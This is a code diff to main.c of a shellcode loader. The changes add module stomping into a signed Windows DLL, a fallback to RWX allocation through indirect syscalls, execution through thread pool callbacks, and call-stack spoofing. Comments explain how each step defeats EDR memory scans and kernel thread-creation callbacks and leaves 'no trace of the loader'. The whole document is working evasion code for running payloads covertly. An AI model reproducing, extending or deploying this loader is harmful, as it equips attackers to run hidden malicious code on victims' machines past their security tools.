@@ -1,5 +1,10 @@
 // =============================================
 // main.c - Shellcode Loader
+//
+// Execution: Module Stomping + Thread Pool Callback + Call Stack Spoofing
+// Memory:    Shellcode planted in signed DLL .text section
+// Thread:    No NtCreateThreadEx — uses TpAllocWork/TpPostWork (reuses existing threads)
+// Stack:     SpoofCallback tail-call preserves clean ntdll thread pool frames
 // =============================================
 
 #include "Common.h"
@@ -71,70 +76,119 @@ int Main(VOID) {
     MemSet(pRealKey, 0, KEY_SIZE);
     HeapFree(GetProcessHeap(), 0, pRealKey);
 
-    // Allocate RW
-    PVOID   pExec       = NULL;
-    SIZE_T  sRegion     = (SIZE_T)dwPayloadSize;
+    // ============================================================
+    // Stage 1: Module Stomping
+    // Try to plant shellcode in a legitimate DLL's .text section.
+    // If shellcode fits, execution memory is attributed to a
+    // signed Windows DLL — EDR memory scans see a legit module.
+    // Falls back to NtAllocateVirtualMemory if too large.
+    // ============================================================
+    PVOID pExec = NULL;
+    BOOL  bStomped = ModuleStomp(&WinApis, pPayload, dwPayloadSize, &pExec);
 
-    SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
-    STATUS = RunSyscall(
-        (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
-        (ULONG_PTR)0, (ULONG_PTR)&sRegion,
-        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
-        0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS)) {
-        HeapFree(GetProcessHeap(), 0, pPayload);
-        return 0;
+    if (!bStomped) {
+        LOG("[*] Module stomp failed, fallback to NtAllocateVirtualMemory");
+
+        // Allocate RW memory via indirect syscall
+        SIZE_T sRegion = (SIZE_T)dwPayloadSize;
+
+        SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
+        STATUS = RunSyscall(
+            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
+            (ULONG_PTR)0, (ULONG_PTR)&sRegion,
+            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
+            0, 0, 0, 0, 0, 0
+        );
+        if (!NT_SUCCESS(STATUS)) {
+            HeapFree(GetProcessHeap(), 0, pPayload);
+            return 0;
+        }
+
+        // Copy shellcode
+        MemCopy(pExec, pPayload, dwPayloadSize);
+
+        // RW -> RWX (RWX for Go-based shellcode that writes to own pages)
+        ULONG   dwOldProt  = 0;
+        SIZE_T  sProtSize  = (SIZE_T)dwPayloadSize;
+        PVOID   pProtAddr  = pExec;
+
+        SET_SYSCALL(NtApis.NtProtectVirtualMemory);
+        STATUS = RunSyscall(
+            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
+            (ULONG_PTR)&sProtSize, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
+            (ULONG_PTR)&dwOldProt,
+            0, 0, 0, 0, 0, 0, 0
+        );
+        if (!NT_SUCCESS(STATUS)) {
+            HeapFree(GetProcessHeap(), 0, pPayload);
+            return 0;
+        }
     }
 
-    // Copy + wipe heap
-    MemCopy(pExec, pPayload, dwPayloadSize);
+    // Wipe original payload from heap
     MemSet(pPayload, 0, dwPayloadSize);
     HeapFree(GetProcessHeap(), 0, pPayload);
 
-    // RW -> RWX
-    ULONG   dwOldProt   = 0;
-    SIZE_T  sProtSize   = (SIZE_T)dwPayloadSize;
-    PVOID   pProtAddr   = pExec;
+    // ============================================================
+    // Stage 2: Call Stack Spoofing + Callback Execution
+    //
+    // Instead of NtCreateThreadEx (triggers PsSetCreateThreadNotifyRoutine
+    // kernel callback), we execute via the Windows Thread Pool.
+    //
+    // TpAllocWork + TpPostWork dispatch work to an EXISTING thread pool
+    // thread — no new thread is created, so the kernel thread-creation
+    // callback never fires.
+    //
+    // SpoofCallback (ASM) is the thread pool callback wrapper. It uses
+    // a tail-call (JMP, not CALL) to the shellcode, so no new stack
+    // frame is created. The resulting call stack is:
+    //
+    //   shellcode RIP  (in stomped DLL .text = legitimate module)
+    //   -> TppWorkpExecute     (ntdll)
+    //   -> TppWorkerThread     (ntdll)
+    //   -> RtlUserThreadStart  (ntdll)
+    //
+    // All frames are clean ntdll internals. No trace of the loader.
+    // ============================================================
 
-    SET_SYSCALL(NtApis.NtProtectVirtualMemory);
-    STATUS = RunSyscall(
-        (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
-        (ULONG_PTR)&sProtSize, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
-        (ULONG_PTR)&dwOldProt,
-        0, 0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS))
+    // Store shellcode address for the ASM callback wrapper
+    SetSpoofTarget(pExec);
+
+    // Resolve thread pool functions from ntdll (hash-based, no strings)
+    BYTE xNtdll[] = XSTR_NTDLL_DLL;
+    DEOBF(xNtdll);
+    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
+    if (!pNtdll)
         return 0;
 
-    // Execute via NtCreateThreadEx (indirect syscall - no kernel32 import)
-    HANDLE hThread = NULL;
-    SET_SYSCALL(NtApis.NtCreateThreadEx);
-    STATUS = RunSyscall(
-        (ULONG_PTR)&hThread,            // [out] thread handle
-        (ULONG_PTR)0x1FFFFF,            // THREAD_ALL_ACCESS
-        (ULONG_PTR)NULL,                // object attributes
-        (ULONG_PTR)(HANDLE)-1,          // current process
-        (ULONG_PTR)pExec,               // start routine
-        (ULONG_PTR)NULL,                // argument
-        (ULONG_PTR)0,                   // create flags
-        (ULONG_PTR)0,                   // zero bits
-        (ULONG_PTR)0,                   // stack size
-        (ULONG_PTR)0,                   // max stack size
-        (ULONG_PTR)NULL,                // attribute list
-        (ULONG_PTR)0                    // padding
-    );
-    if (!NT_SUCCESS(STATUS))
+    fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
+    fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);
+
+    if (!pTpAllocWork || !pTpPostWork)
         return 0;
 
-    // Wait via NtWaitForSingleObject (indirect syscall)
-    SET_SYSCALL(NtApis.NtWaitForSingleObject);
-    RunSyscall(
-        (ULONG_PTR)hThread,             // handle
-        (ULONG_PTR)FALSE,               // alertable
-        (ULONG_PTR)NULL,                // timeout (NULL = infinite)
-        0, 0, 0, 0, 0, 0, 0, 0, 0      // padding
-    );
+    // Create thread pool work item with SpoofCallback as the callback
+    PVOID pWork = NULL;
+    STATUS = pTpAllocWork(&pWork, (PVOID)SpoofCallback, NULL, NULL);
+    if (!NT_SUCCESS(STATUS) || !pWork)
+        return 0;
+
+    LOG("[*] Executing via thread pool callback (spoofed stack)...");
+
+    // Post work — triggers SpoofCallback on a thread pool thread
+    pTpPostWork(pWork);
+
+    // Keep process alive with infinite delay (indirect syscall)
+    // NtDelayExecution avoids any kernel32 dependency for the wait
+    LARGE_INTEGER li;
+    li.QuadPart = -315360000000000LL; // ~1 year in 100ns units
+    while (TRUE) {
+        SET_SYSCALL(NtApis.NtDelayExecution);
+        RunSyscall(
+            (ULONG_PTR)FALSE, (ULONG_PTR)&li,
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+        );
+    }
 
     return 0;
 }
